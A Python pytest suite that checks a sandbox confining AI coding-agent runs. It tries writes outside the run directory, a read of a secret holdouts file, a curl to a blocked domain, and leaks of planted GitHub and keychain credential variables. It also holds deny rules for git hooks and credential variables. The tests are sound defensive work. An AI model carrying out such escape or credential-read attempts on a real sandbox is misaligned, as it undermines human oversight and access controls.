"""F-05 acceptance tests — BUILD-ORDER.md, work order F-05.

Contract rule (CLAUDE.md): an acceptance ref ``tests/test_f05.py::test_ac_N``
means a test function with exactly that name. Every acceptance test *attempts*
the forbidden action inside a real ``srt`` sandbox — none of them merely
inspect the generated settings.

No-skip policy (owner decision, 2026-10-16): a broken sandbox stack is a
failure, never a silent skip. Locally (macOS) ``srt`` comes from this repo's
pinned ``node_modules``; on CI (Ubuntu) the workflow installs bubblewrap,
socat and ripgrep, and lifts the AppArmor unprivileged-userns restriction
before pytest. If any of that breaks, these tests fail loudly.
"""

import json
import os
import shlex
import shutil
import subprocess
import sys
import textwrap
import time
from pathlib import Path

import pytest

from factory.runs import RunError, cleanup_run, create_run
from factory.sandbox import (
    SRT_PIN,
    SandboxError,
    _toolchain_allowread,
    build_settings,
    can_apply_seatbelt,
    ensure_srt,
    run_sandboxed,
    sandbox_env,
    srt_bin,
    write_settings,
)

MODEL_ENDPOINT = "api.z.ai"
REPO_ROOT = Path(__file__).resolve().parent.parent


def _git(repo: Path, *args: str) -> None:
    subprocess.run(
        ["git", "-C", str(repo), *args], check=True, capture_output=True, text=True
    )


def _fixture_repo(tmp_path: Path) -> Path:
    """A tiny local repo to clone from (the real clone source for runs)."""
    repo = tmp_path / "source-repo"
    repo.mkdir()
    (repo / "README.md").write_text("# fixture\n")
    _git(repo, "init", "-b", "main")
    _git(repo, "config", "user.email", "test@factory.local")
    _git(repo, "config", "user.name", "factory test")
    _git(repo, "add", "-A")
    _git(repo, "commit", "-m", "base")
    return repo


def _factory_root(tmp_path: Path) -> Path:
    root = tmp_path / "factory-root"
    (root / "holdouts").mkdir(parents=True)
    (root / "holdouts" / "scenario.md").write_text("holdout scenario — secret")
    return root


def _make_run(tmp_path: Path, **kwargs):
    """Create a real run (clone + settings) and hand back (run, factory_root, settings)."""
    root = _factory_root(tmp_path)
    run = create_run("fixture", _fixture_repo(tmp_path), factory_root=root, **kwargs)
    settings = build_settings(
        {"docs_allowlist": ["docs.python.org"], "network_allowlist": ["pypi.org"]},
        run.root,
        model_endpoint=MODEL_ENDPOINT,
        forbidden_env=("JFO_PROBE_PASS",),
    )
    write_settings(settings, run.settings_path)
    return run, root, settings


def _child(script: str, args: list[str]) -> list[str]:
    return [sys.executable, "-c", script, *args]


def _env_probe(planted: set[str]) -> str:
    """A child script printing ``NAME=<value>`` per argv name — but only
    values the test planted itself; anything else (a real ambient
    credential that crossed) prints as redacted, so a failing assert or
    its ``proc.stdout`` message can never show a real secret."""
    return textwrap.dedent(
        f"""
        import os, sys
        planted = {sorted(planted)!r}
        for name in sys.argv[1:]:
            value = os.environ.get(name)
            if value is None:
                shown = 'absent'
            elif value in planted:
                shown = value
            else:
                shown = '<set, redacted>'
            print(f"{{name}}={{shown}}", flush=True)
        """
    )


# --- F-05 AC-1: a sandboxed process can't write outside the run dir -------


def test_ac_1(tmp_path: Path):
    run, root, settings = _make_run(tmp_path)
    outside_run = root / "probe-outside.txt"
    outside_tmp = Path("/tmp") / f"f05-probe-{os.getpid()}.txt"
    script = textwrap.dedent(
        """
        import sys
        def attempt(label, fn):
            try:
                fn()
                print(f"{label}:ok", flush=True)
            except Exception as exc:
                print(f"{label}:denied {type(exc).__name__}", flush=True)
        inside, outside_run, outside_tmp = sys.argv[1], sys.argv[2], sys.argv[3]
        attempt("inside", lambda: open(inside, "w").write("x"))
        attempt("outside_run", lambda: open(outside_run, "w").write("x"))
        attempt("outside_tmp", lambda: open(outside_tmp, "w").write("x"))
        """
    )
    proc = run_sandboxed(
        _child(script, [str(run.root / "inside.txt"), str(outside_run), str(outside_tmp)]),
        run.root,
        run.settings_path,
        timeout=60,
    )
    outcomes = dict(line.split(":", 1) for line in proc.stdout.splitlines())
    assert outcomes["inside"] == "ok", proc.stdout + proc.stderr
    assert (run.root / "inside.txt").read_text() == "x"  # reached the host
    # F-47 re-seat: the invariant is the HOST. Both platforms: nothing
    # written outside the run dir exists on the host afterwards.
    assert not outside_run.exists() and not outside_tmp.exists()
    if sys.platform == "darwin":
        # Seatbelt refuses the write itself.
        assert outcomes["outside_run"].startswith("denied"), (
            "write outside the run dir but inside the factory root succeeded\n"
            f"{proc.stdout}{proc.stderr}"
        )
    else:
        # bwrap: the factory root is read-denied (F-47), which srt
        # implements as a tmpfs mounted over it — a write there lands in
        # that tmpfs and dies with the sandbox. "ok" is accepted ONLY
        # together with the host-absence assertion above.
        assert outcomes["outside_run"].startswith(("denied", "ok")), (
            f"{proc.stdout}{proc.stderr}"
        )
    assert outcomes["outside_tmp"].startswith("denied"), (
        f"write to /tmp succeeded\n{proc.stdout}{proc.stderr}"
    )


# --- F-05 AC-2: a sandboxed process can't read ~/factory/holdouts ---------


def test_ac_2(tmp_path: Path):
    run, root, settings = _make_run(tmp_path)
    script = textwrap.dedent(
        """
        import sys
        def attempt(label, fn):
            try:
                fn()
                print(f"{label}:ok", flush=True)
            except Exception as exc:
                print(f"{label}:denied {type(exc).__name__}", flush=True)
        holdout, control = sys.argv[1], sys.argv[2]
        attempt("holdout", lambda: open(holdout).read())
        attempt("control", lambda: open(control).read())
        """
    )
    control = run.root / "README.md"
    proc = run_sandboxed(
        _child(script, [str(root / "holdouts" / "scenario.md"), str(control)]),
        run.root,
        run.settings_path,
        timeout=60,
    )
    outcomes = dict(line.split(":", 1) for line in proc.stdout.splitlines())
    assert "holdout" in outcomes and "control" in outcomes, (
        f"child did not report its attempts\n{proc.stdout}{proc.stderr}"
    )
    assert outcomes["holdout"].startswith("denied"), (
        f"holdouts file was readable inside the sandbox\n{proc.stdout}{proc.stderr}"
    )
    assert outcomes["control"] == "ok", (
        "reads inside the run dir are broken too — the denial is too broad\n"
        f"{proc.stdout}{proc.stderr}"
    )


# --- F-05 AC-3: network allowlist ------------------------------------------


def test_ac_3(tmp_path: Path):
    run, _, settings = _make_run(tmp_path)
    script = textwrap.dedent(
        """
        import subprocess, sys

        def fetch(url):
            proc = subprocess.run(
                ["curl", "-sS", "-o", "/dev/null", "-w", "%{http_code}",
                 "--max-time", "20", url],
                capture_output=True, text=True,
            )
            return proc.returncode, (proc.stdout or "").strip(), proc.stderr.strip()

        allowed_code, blocked_code, blocked_err = None, None, None
        rc, code, err = fetch(sys.argv[1])
        print(f"allowed rc={rc} code={code} err={err!r}", flush=True)
        if rc == 0 and code != "000":
            allowed_code = code
        rc, code, err = fetch(sys.argv[2])
        print(f"blocked rc={rc} code={code} err={err!r}", flush=True)
        blocked_code, blocked_err = code, err
        print(f"RESULT allowed={allowed_code} blocked_code={blocked_code}", flush=True)
        """
    )
    proc = run_sandboxed(
        _child(script, [f"https://{MODEL_ENDPOINT}", "https://example.com"]),
        run.root,
        run.settings_path,
        timeout=120,
    )
    result = [ln for ln in proc.stdout.splitlines() if ln.startswith("RESULT")]
    assert result, f"child produced no verdict\n{proc.stdout}{proc.stderr}"
    allowed = result[0].split("allowed=")[1].split()[0]
    blocked = result[0].split("blocked_code=")[1].strip()
    assert allowed != "None", (
        "api.z.ai was NOT reachable from inside the sandbox. The allowlist names it, "
        "so this is either a Z.ai outage (external — retry before debugging) or a "
        "sandbox/proxy misconfiguration; the blocked-domain control below tells them "
        f"apart.\n{proc.stdout}{proc.stderr}"
    )
    assert blocked == "000", (
        f"non-allowlisted example.com was reachable (http_code={blocked})\n"
        f"{proc.stdout}{proc.stderr}"
    )


# --- INC-006: git init works inside the sandbox ------------------------------


def test_sandbox_env_sets_empty_git_templates(tmp_path: Path):
    """The child env points GIT_TEMPLATE_DIR at an empty scratch dir:
    git init/clone then write nothing into .git/hooks/, which srt
    blocks beneath the child's cwd (INC-006)."""
    run, _root, _settings = _make_run(tmp_path)
    env = sandbox_env(run.root)
    templates = Path(env["GIT_TEMPLATE_DIR"])
    assert templates.is_dir()
    assert templates.parent == run.root / ".home"
    assert not any(templates.iterdir()), "template dir must start empty"


def test_sandbox_env_sets_claude_code_tmpdir_inside_the_run(tmp_path: Path):
    """The child env points CLAUDE_CODE_TMPDIR at the run's scratch.

    The pinned Claude CLI (claude-agent-sdk 0.2.168's bundled binary)
    builds its per-uid scratch root — ``<root>/claude-<uid>/<cwd-slug>``,
    where the Bash tool's shell snapshots live — from
    ``CLAUDE_CODE_TMPDIR`` or a HARDCODED ``/tmp`` (the binary's ``sm()``:
    ``let e=a.CLAUDE_CODE_TMPDIR;if(e)return e;return "/tmp"``). TMPDIR
    is never consulted for that root, so run 20261029T145356Z-b1875d
    lost all 21 Bash calls to ``EPERM mkdir /private/tmp/claude-501/…``
    while Read/Write/Edit worked. The env must redirect the CLI's root
    into the run's writable scratch — never widen the sandbox to /tmp."""
    run, _root, _settings = _make_run(tmp_path)
    env = sandbox_env(run.root)
    assert env["CLAUDE_CODE_TMPDIR"] == str(run.root / ".tmp")


def test_claude_cli_temp_root_mkdir_lands_in_run_scratch(tmp_path: Path):
    """The exact mkdir the CLI performs, run confined: resolve the root
    the way ``sm()`` does (CLAUDE_CODE_TMPDIR, else /tmp), then
    ``mkdir -p <root>/claude-<uid>/<slug>`` mode 0700. Without the env
    redirect the mkdir lands on /private/tmp and the sandbox denies it
    — the dead-Bash signature of run 20261029T145356Z-b1875d; with it,
    the dir lands inside the run. The control re-proves /tmp itself
    stays write-denied: the fix redirects, it does not widen."""
    run, _root, _settings = _make_run(tmp_path)
    script = textwrap.dedent(
        """
        import os

        def probe(label, root):
            target = os.path.join(root, f"claude-{os.getuid()}", "probe-slug")
            try:
                os.makedirs(target, mode=0o700, exist_ok=True)
                print(f"{label}:{os.path.isdir(target)}", flush=True)
            except OSError as exc:
                print(f"{label}:denied {type(exc).__name__}", flush=True)

        probe("default", os.environ.get("CLAUDE_CODE_TMPDIR") or "/tmp")
        probe("tmpctl", "/tmp")
        """
    )
    proc = run_sandboxed(
        _child(script, []), run.root, run.settings_path, timeout=60,
    )
    outcomes = dict(line.split(":", 1) for line in proc.stdout.splitlines())
    assert outcomes.get("default") == "True", (
        "the CLI-equivalent temp-root mkdir failed — a sandboxed session's "
        "Bash tool is dead exactly as in run 20261029T145356Z-b1875d\n"
        f"{proc.stdout}{proc.stderr}"
    )
    assert outcomes.get("tmpctl", "missing").startswith("denied"), (
        "/tmp became writable inside the sandbox — the fix must redirect "
        f"the CLI's temp root, never widen allowWrite\n{proc.stdout}{proc.stderr}"
    )
    assert (run.root / ".tmp" / f"claude-{os.getuid()}" / "probe-slug").is_dir()


def test_session_env_window_keeps_claude_code_tmpdir(monkeypatch):
    """The env window must not strip CLAUDE_CODE_TMPDIR before the SDK
    spawns the CLI: the redirect only reaches the CLI if it survives
    ``_window_environ`` — process mechanics like GIT_TEMPLATE_DIR, a path
    and never a credential."""
    import factory.session as session_module

    monkeypatch.setenv("CLAUDE_CODE_TMPDIR", "/run/.tmp")
    saved = session_module._window_environ({})
    try:
        assert os.environ.get("CLAUDE_CODE_TMPDIR") == "/run/.tmp"
    finally:
        os.environ.clear()
        os.environ.update(saved)


def test_sandbox_env_prepends_the_run_venv_to_path(tmp_path: Path):
    """A caller-provided run-local venv reaches the child as PATH
    precedence plus VIRTUAL_ENV: ``pip``/``python`` resolve into
    ``<run>/.venv`` before anything ambient. The ambient PATH survives
    after the prefix (npm and the re-allowed toolchain stay findable)."""
    run, _root, _settings = _make_run(tmp_path)
    venv = run.root / ".venv"
    (venv / "bin").mkdir(parents=True)
    env = sandbox_env(run.root, venv=venv)
    path = env["PATH"].split(":")
    assert path[0] == str(venv / "bin"), env["PATH"]
    assert env["VIRTUAL_ENV"] == str(venv)
    without = sandbox_env(run.root)["PATH"].split(":")
    assert path[1:] == without, "the ambient PATH must survive after the prefix"


def test_sandbox_path_keeps_a_home_toolchain_dir_the_sandbox_reallows(
    tmp_path: Path, monkeypatch
):
    """Node from nvm/fnm/volta lives under $HOME. The PATH filter drops
    home entries (a denied dir probed first can EPERM a lookup), but a
    home bin dir that build_settings re-allows for reading — the install
    dir of a toolchain binary — must stay on PATH, or the L0 setup's
    ``npm ci`` exits 127 ("npm: command not found"). Unrelated home
    entries are still dropped."""
    home = tmp_path / "home"
    node_bin = home / ".nvm" / "versions" / "node" / "v22.12.0" / "bin"
    node_bin.mkdir(parents=True)
    for name in ("node", "npm"):
        tool = node_bin / name
        tool.write_text("#!/bin/sh\n")
        tool.chmod(0o755)
    other = home / ".local" / "bin"
    other.mkdir(parents=True)
    monkeypatch.setenv("HOME", str(home))
    monkeypatch.setenv("PATH", f"{other}:{node_bin}:/usr/bin:/bin")
    run, _root, _settings = _make_run(tmp_path)
    path = sandbox_env(run.root)["PATH"].split(":")
    assert str(node_bin) in path or str(node_bin.resolve()) in path, path
    assert str(other) not in path and str(other.resolve()) not in path, path
    assert path[-2:] == ["/usr/bin", "/bin"], path
    # consistency: what PATH keeps, the sandbox can read
    settings = build_settings(
        {"docs_allowlist": [], "network_allowlist": []},
        run.root,
        model_endpoint=MODEL_ENDPOINT,
    )
    assert str(node_bin.resolve()) in settings["filesystem"]["allowRead"]


def test_build_settings_relaxes_git_config_but_not_the_run_clone(tmp_path):
    """init/clone must write .git/config, so the built-in .git/config
    block is relaxed (allowGitConfig) — while the run clone's own
    .git/{hooks,config,info} stay on the explicit denyWrite list: the
    agent still cannot plant hooks or redirect the remote of the clone
    the orchestrator commits from."""
    _run, _root, settings = _make_run(tmp_path)
    assert settings["filesystem"]["allowGitConfig"] is True
    denied = settings["filesystem"]["denyWrite"]
    assert any(d.endswith("/.git/hooks") for d in denied)
    assert any(d.endswith("/.git/config") for d in denied)


def test_git_init_succeeds_inside_the_sandbox(tmp_path: Path):
    """The incident itself: the project's whole suite runs in the L0
    sandbox and builds a fixture repo per test — `git init` there must
    succeed confined (the suite inits via ``git -C`` into its tmp area,
    not at the child's cwd)."""
    run, _root, _settings = _make_run(tmp_path)
    work = run.root / ".tmp" / "inc006"
    work.mkdir(parents=True, exist_ok=True)
    proc = run_sandboxed(
        ["git", "-C", str(work), "init", "-q", "-b", "main"],
        run.root,
        run.settings_path,
        timeout=60,
    )
    assert proc.returncode == 0, proc.stdout + proc.stderr
    assert (work / ".git" / "HEAD").is_file()


def test_git_clone_succeeds_inside_the_sandbox(tmp_path: Path):
    """clone runs the same template-copy path as init (INC-006's sibling):
    a local clone made confined must come out with a HEAD and an empty
    hooks dir — nothing ever written into the blocked path."""
    run, _root, _settings = _make_run(tmp_path)
    origin = run.root / ".tmp" / "origin"
    origin.mkdir(parents=True, exist_ok=True)
    subprocess.run(
        ["git", "-C", str(origin), "init", "-q", "-b", "main"], check=True
    )
    subprocess.run(
        ["git", "-C", str(origin), "-c", "user.email=f@x", "-c", "user.name=f",
         "commit", "-q", "--allow-empty", "-m", "base"],
        check=True,
    )
    proc = run_sandboxed(
        ["git", "-C", str(run.root / ".tmp"), "clone", "-q", str(origin), "work"],
        run.root,
        run.settings_path,
        timeout=60,
    )
    assert proc.returncode == 0, proc.stdout + proc.stderr
    clone_git = run.root / ".tmp" / "work" / ".git"
    assert (clone_git / "HEAD").is_file()
    hooks = clone_git / "hooks"
    assert not hooks.exists() or not any(hooks.iterdir()), (
        f"clone wrote into the blocked hooks path: {sorted(hooks.iterdir())}"
    )


def test_session_env_window_keeps_git_template_dir(monkeypatch):
    """INC-006 must hold for the agent too, not just L0's children: the
    in-sandbox session runner windows os.environ down to an allowlist
    before Claude Code starts, and the agent's Bash inherits that. A
    window that drops GIT_TEMPLATE_DIR puts every ``git init`` the
    agent's red-first pytest runs back on the hooks-copy denial."""
    import factory.session as session_module

    monkeypatch.setenv("GIT_TEMPLATE_DIR", "/run/.home/.git-templates")
    saved = session_module._window_environ({})
    try:
        assert os.environ.get("GIT_TEMPLATE_DIR") == "/run/.home/.git-templates"
    finally:
        os.environ.clear()
        os.environ.update(saved)


def test_git_init_succeeds_inside_the_sandbox_after_the_session_window(
    tmp_path: Path, monkeypatch
):
    """The same, end to end: the environment the session runner leaves
    for Claude Code (the child's sandbox env, then the window) must
    still let ``git init`` under TMPDIR succeed confined. The window is
    applied to the exact env the sandboxed child gets, and the git runs
    with only that env (``env -i``), as the agent's Bash would."""
    import factory.session as session_module

    run, _root, _settings = _make_run(tmp_path)
    child_env = sandbox_env(run.root)
    saved = dict(os.environ)
    try:
        os.environ.clear()
        os.environ.update(child_env)
        session_module._window_environ({})
        windowed = dict(os.environ)
    finally:
        os.environ.clear()
        os.environ.update(saved)
    target = Path(windowed["TMPDIR"]) / "after-window"
    proc = run_sandboxed(
        ["/usr/bin/env", "-i", *[f"{k}={v}" for k, v in windowed.items()],
         "git", "init", "-q", str(target)],
        run.root, run.settings_path, timeout=120,
    )
    assert proc.returncode == 0, proc.stdout + proc.stderr
    assert (target / ".git" / "HEAD").is_file()


# --- INC-007: nesting is detected, not fought -------------------------------

# Host-capability tests: what they assert (or deliberately do — planting
# hooks in a run clone, spawning srt raw, asserting the probe itself)
# only works where a seatbelt can be applied. Nested, they skip.
pytestmark_nested = pytest.mark.skipif(
    not can_apply_seatbelt(),
    reason="nested seatbelt cannot apply a profile (INC-007)",
)


def test_can_apply_seatbelt_is_true_where_tests_run():
    """On a host (and CI) the probe answers True: the sandbox tests
    below run for real. Inside a macOS sandbox it answers False and
    conftest turns run_sandboxed into a skip — macOS cannot apply a
    seatbelt profile from inside one, so a nested srt is refused by the
    kernel whatever the settings allow.

    Deliberately NOT gated on the probe (review of #57): the skip
    condition would be the negation of the assertion and the test could
    never fail. "Am I nested?" is answered independently, by asking the
    kernel whether this process already runs under a sandbox — so a
    host where the probe wrongly answers False goes red here instead of
    silently skipping the whole sandbox suite."""
    from factory.sandbox import can_apply_seatbelt, process_is_sandboxed

    if sys.platform != "darwin" or not process_is_sandboxed():
        assert can_apply_seatbelt() is True
    else:
        assert can_apply_seatbelt() is False


class _ProbeResult:
    def __init__(self, returncode: int, stderr: str = ""):
        self.returncode = returncode
        self.stdout = ""
        self.stderr = stderr


_NESTED_REFUSAL = "sandbox-exec: sandbox_apply: Operation not permitted\n"


@pytest.mark.parametrize(
    "outcome, sandboxed",
    [
        (OSError("No such file or directory: /usr/bin/sandbox-exec"), False),
        (subprocess.TimeoutExpired(["/usr/bin/sandbox-exec"], 15), False),
        (_ProbeResult(1, "sandbox-exec: some other failure\n"), False),
        # the nested refusal text, but the kernel says this process is
        # NOT sandboxed: not nesting — a broken host stack
        (_ProbeResult(71, _NESTED_REFUSAL), False),
        # sandboxed, but the probe failed for another reason
        (_ProbeResult(1, "sandbox-exec: some other failure\n"), True),
        (subprocess.TimeoutExpired(["/usr/bin/sandbox-exec"], 15), True),
    ],
    ids=["oserror", "timeout", "other-rc", "refusal-unsandboxed",
         "other-rc-sandboxed", "timeout-sandboxed"],
)
def test_seatbelt_probe_failure_is_loud_not_nested(monkeypatch, outcome, sandboxed):
    """A probe that fails for any reason other than the kernel's nested
    refusal must raise, never answer "nested": False turns every sandbox
    test into a skip and the suite stays green on a host whose sandbox
    stack is broken (README/CLAUDE.md: the F-05 tests fail, never skip)."""
    import factory.sandbox as sandbox_module

    def fake_run(*args, **kwargs):
        if isinstance(outcome, BaseException):
            raise outcome
        return outcome

    monkeypatch.setattr(sandbox_module.sys, "platform", "darwin")
    monkeypatch.setattr(sandbox_module.subprocess, "run", fake_run)
    monkeypatch.setattr(sandbox_module, "process_is_sandboxed", lambda: sandboxed)
    sandbox_module.can_apply_seatbelt.cache_clear()
    try:
        with pytest.raises(SandboxError, match="seatbelt probe"):
            sandbox_module.can_apply_seatbelt()
    finally:
        sandbox_module.can_apply_seatbelt.cache_clear()


def test_seatbelt_probe_answers_nested_only_on_the_kernel_refusal(monkeypatch):
    """The one False: the probe was refused with sandbox_apply EPERM AND
    the kernel reports this process already sandboxed. A clean probe is
    True. Both answers are cached for the session."""
    import factory.sandbox as sandbox_module

    calls = []

    def fake_run(*args, **kwargs):
        calls.append(args)
        return outcome

    monkeypatch.setattr(sandbox_module.sys, "platform", "darwin")
    monkeypatch.setattr(sandbox_module.subprocess, "run", fake_run)
    try:
        outcome = _ProbeResult(71, _NESTED_REFUSAL)
        monkeypatch.setattr(sandbox_module, "process_is_sandboxed", lambda: True)
        sandbox_module.can_apply_seatbelt.cache_clear()
        assert sandbox_module.can_apply_seatbelt() is False
        assert sandbox_module.can_apply_seatbelt() is False
        assert len(calls) == 1, "the nested answer is cached"

        outcome = _ProbeResult(0)
        monkeypatch.setattr(sandbox_module, "process_is_sandboxed", lambda: False)
        sandbox_module.can_apply_seatbelt.cache_clear()
        assert sandbox_module.can_apply_seatbelt() is True
    finally:
        sandbox_module.can_apply_seatbelt.cache_clear()


def test_process_is_sandboxed_tracks_a_real_seatbelt(tmp_path: Path):
    """The independent nesting signal is the kernel's own answer: False
    for this (unsandboxed) process, True for a child started under a
    seatbelt profile. On a host where the suite itself runs nested, the
    first half flips and the second still holds."""
    from factory.sandbox import process_is_sandboxed

    if sys.platform != "darwin":
        assert process_is_sandboxed() is False
        return
    script = (
        f"import sys; sys.path.insert(0, {str(REPO_ROOT)!r}); "
        "from factory.sandbox import process_is_sandboxed; "
        "print(process_is_sandboxed())"
    )
    if not process_is_sandboxed():
        child = subprocess.run(
            ["/usr/bin/sandbox-exec", "-p", "(version 1)(allow default)",
             sys.executable, "-c", script],
            capture_output=True, text=True, timeout=60,
        )
        assert child.returncode == 0, child.stderr
        assert child.stdout.strip() == "True", child.stdout + child.stderr


def _conftest_harness(
    tmp_path: Path, probe: "bool | str"
) -> subprocess.CompletedProcess:
    """Run a throwaway pytest against a copy of this repo's conftest and
    factory package, with the seatbelt probe forced to ``probe`` before
    conftest loads (``"raise"``: the probe raises SandboxError, a broken
    host stack). The probe test inside reports what run_sandboxed is."""
    root = tmp_path / f"harness-{probe}"
    shutil.copytree(REPO_ROOT / "factory", root / "factory",
                    ignore=shutil.ignore_patterns("__pycache__"))
    (root / "tests").mkdir(parents=True)
    shutil.copy2(REPO_ROOT / "tests" / "conftest.py", root / "tests" / "conftest.py")
    if probe == "raise":
        forced = (
            "def _broken():\n"
            "    raise s.SandboxError('seatbelt probe failed: forced by harness')\n"
            "s.can_apply_seatbelt = _broken\n"
        )
    else:
        forced = f"s.can_apply_seatbelt = lambda: {probe!r}\n"
    (root / "force_probe.py").write_text("import factory.sandbox as s\n" + forced)
    (root / "tests" / "test_probe.py").write_text(textwrap.dedent(
        """
        import factory.sandbox as s

        def test_spawn(tmp_path):
            real = s.run_sandboxed.__code__.co_name == "run_sandboxed"
            print("REAL" if real else "PATCHED")
            if not real:
                s.run_sandboxed(["true"], tmp_path, tmp_path / "settings.json")
        """
    ))
    env = {k: v for k, v in os.environ.items() if not k.startswith("PYTEST")}
    env["PYTHONPATH"] = str(root)
    return subprocess.run(
        [sys.executable, "-m", "pytest", "-p", "force_probe", "-rs", "-s",
         "-p", "no:cacheprovider", "--no-header", "tests/test_probe.py"],
        cwd=root, env=env, capture_output=True, text=True, timeout=300,
    )


def test_conftest_guards_sandbox_spawning_tests_when_nested(tmp_path: Path):
    """The skip lives in tests/conftest.py, one point for every test
    that spawns a sandbox (INC-007): patched only when the seatbelt
    probe says nesting is impossible, never on a host. Asserted by
    behaviour, not by grepping the file (review of #56): with the probe
    forced False a run_sandboxed call skips with the INC-007 reason from
    conftest; with it forced True run_sandboxed is the real function and
    nothing is skipped."""
    nested = _conftest_harness(tmp_path, probe=False)
    assert "PATCHED" in nested.stdout, nested.stdout + nested.stderr
    assert "1 skipped" in nested.stdout, nested.stdout + nested.stderr
    assert "conftest.py" in nested.stdout and "(INC-007)" in nested.stdout, (
        nested.stdout
    )

    host = _conftest_harness(tmp_path, probe=True)
    assert "REAL" in host.stdout, host.stdout + host.stderr
    assert "1 passed" in host.stdout and "skipped" not in host.stdout, (
        host.stdout + host.stderr
    )


def test_conftest_probe_failure_stops_the_suite(tmp_path: Path):
    """INC-007's standing rule, end to end through conftest: a seatbelt
    probe that fails on a host (SandboxError — anything but the kernel's
    nested refusal) stops the run with a pytest usage error naming
    INC-007. It never answers "nested", so the sandbox tests are never
    quietly skipped and no test runs at all (review of #56/#57)."""
    broken = _conftest_harness(tmp_path, probe="raise")
    out = broken.stdout + broken.stderr
    assert broken.returncode == pytest.ExitCode.USAGE_ERROR, out
    assert "INC-007 seatbelt probe failed on this host" in out, out
    assert "forced by harness" in out, out
    assert "REAL" not in out and "PATCHED" not in out, out
    assert "skipped" not in out and "passed" not in out, out


# macOS-only: the nesting probe exists for the seatbelt, and on Linux
# can_apply_seatbelt() answers True, so a nested run spawns srt and fails
# instead of skipping. Skipped visibly (-rs), not returned silently, so the
# gap stays on the record until F-58 adds Linux nesting detection.
@pytest.mark.skipif(
    sys.platform != "darwin",
    reason="INC-007 nesting is macOS-seatbelt-only; Linux nesting detection is F-58",
)
def test_nested_suite_skips_instead_of_failing(tmp_path: Path):
    """The L0 shape end to end: this suite run inside a sandbox skips
    its sandbox-spawning tests and still passes its unit tests. A
    sandboxed pytest over the seatbelt-independent tests of this module
    must come back green with skips, not red on sandbox_apply."""
    from factory.sandbox import (
        can_apply_seatbelt,
        run_sandboxed,
    )

    if not can_apply_seatbelt():  # already nested: this test's probe is the claim
        pytest.skip("nested seatbelt cannot apply a profile (INC-007)")
    run, _root, _settings = _make_run(tmp_path)
    # The real code under test must live in the sandbox-readable tree: the
    # editable install points under the owner's home (denyRead), so the
    # package and the tests are copied in — copied, not linked, ditto.
    shutil.copytree(REPO_ROOT / "factory", run.root / "factory",
                    ignore=shutil.ignore_patterns("__pycache__"))
    shutil.copytree(REPO_ROOT / "tests", run.root / "tests",
                    ignore=shutil.ignore_patterns("__pycache__"))
    proc = run_sandboxed(
        [sys.executable, "-m", "pytest",
         "tests/test_f05.py::test_run_sandboxed_docstring_matches_the_select_pump",
         "tests/test_f05.py::test_can_apply_seatbelt_is_true_where_tests_run",
         "tests/test_f05.py::test_ac_1", "-q", "-rs", "--no-header"],
        run.root, run.settings_path, timeout=300,
    )
    out = proc.stdout
    # the seatbelt-independent tests passed inside (including the probe's
    # own truth test: nested, it must answer False); the spawning test
    # skipped inside, and the skip came from the conftest guard with the
    # INC-007 reason — not from anything else that happens to skip
    assert "2 passed, 1 skipped" in out, f"nested suite run:\n{out[-2000:]}"
    skips = [line for line in out.splitlines() if line.startswith("SKIPPED")]
    assert len(skips) == 1, f"nested suite run:\n{out[-2000:]}"
    assert "conftest.py" in skips[0] and "(INC-007)" in skips[0], skips


# --- F-05 AC-4: no GitHub/keychain credentials inside the sandbox ----------


def test_ac_4(tmp_path: Path):
    run, _, settings = _make_run(tmp_path)
    keychain_derived = "JFO_PROBE_PASS"
    names = ["GH_TOKEN", "GITHUB_TOKEN", "GH_HOST", keychain_derived]
    script = _env_probe({"gh-leak", "github-leak", "github.com", "keychain-leak", "3000000"})
    env = sandbox_env(
        run.root,
        extra={
            "GH_TOKEN": "gh-leak",
            "GITHUB_TOKEN": "github-leak",
            "GH_HOST": "github.com",
            keychain_derived: "keychain-leak",
            "API_TIMEOUT_MS": "3000000",
        },
        forbidden=[keychain_derived],
    )
    proc = run_sandboxed(
        _child(script, [*names, "API_TIMEOUT_MS"]), run.root, run.settings_path,
        env=env, timeout=60,
    )
    seen = dict(line.split("=", 1) for line in proc.stdout.splitlines())
    for name in names:
        assert seen[name] == "absent", (
            f"{name} is visible inside the sandbox\n{proc.stdout}{proc.stderr}"
        )
    assert seen["API_TIMEOUT_MS"] == "3000000", proc.stdout

    # Defence in depth: even env vars that slip past our scrubbing are denied
    # by the settings file itself (credentials.envVars), enforced by srt.
    # This layer is probed by invoking srt directly, because run_sandboxed
    # always scrubs the env it is handed — the backstop must hold without it.
    leaky = dict(os.environ)
    leaky.update({"GH_TOKEN": "gh-leak", keychain_derived: "keychain-leak"})
    proc = subprocess.run(
        [
            str(srt_bin()),
            "--settings",
            str(run.settings_path),
            "-c",
            shlex.join(_child(script, ["GH_TOKEN", keychain_derived])),
        ],
        env=leaky,
        cwd=str(run.root),  # outside the denied home dir, like run_sandboxed
        capture_output=True,
        text=True,
        timeout=60,
    )
    seen = dict(line.split("=", 1) for line in proc.stdout.splitlines())
    assert seen["GH_TOKEN"] == "absent" and seen[keychain_derived] == "absent", (
        f"settings-file credential deny did not strip the variables\n{proc.stdout}{proc.stderr}"
    )


# --- srt pinning: check srt --version, refuse on mismatch -------------------


def test_ensure_srt_accepts_the_pinned_version():
    assert ensure_srt() == SRT_PIN


def _fake_srt(tmp_path: Path, version: str) -> Path:
    fake = tmp_path / "fake-srt"
    fake.write_text(f"#!/bin/sh\necho '{version}'\n")
    fake.chmod(0o755)
    return fake


def test_ensure_srt_refuses_a_version_mismatch(tmp_path: Path):
    fake = _fake_srt(tmp_path, "0.0.78")
    with pytest.raises(SandboxError, match="0.0.78"):
        ensure_srt(srt_bin_path=fake)


def test_ensure_srt_fails_when_srt_is_missing(tmp_path: Path):
    with pytest.raises(SandboxError, match="srt"):
        ensure_srt(srt_bin_path=tmp_path / "does-not-exist")


def test_missing_srt_is_a_failure_not_a_skip(tmp_path: Path):
    """A broken install fails loudly; there is no skip path (owner rule).
    Injection is by parameter — there is no env override to set."""
    run, _, settings = _make_run(tmp_path)
    with pytest.raises(SandboxError, match="srt"):
        run_sandboxed(
            ["true"],
            run.root,
            run.settings_path,
            srt_bin_path=tmp_path / "missing-srt",
        )
    assert not (run.root / "inside.txt").exists()


# --- settings generation from the profile -----------------------------------


def test_settings_allowlist_is_model_endpoint_plus_profile_lists(tmp_path: Path):
    run, _, settings = _make_run(tmp_path)
    net = settings["network"]
    assert net["allowedDomains"] == [MODEL_ENDPOINT, "docs.python.org", "pypi.org"]
    assert net["deniedDomains"] == []
    fs = settings["filesystem"]
    assert fs["allowWrite"] == [str(run.root)]
    assert str(run.root / ".git" / "hooks") in fs["denyWrite"]
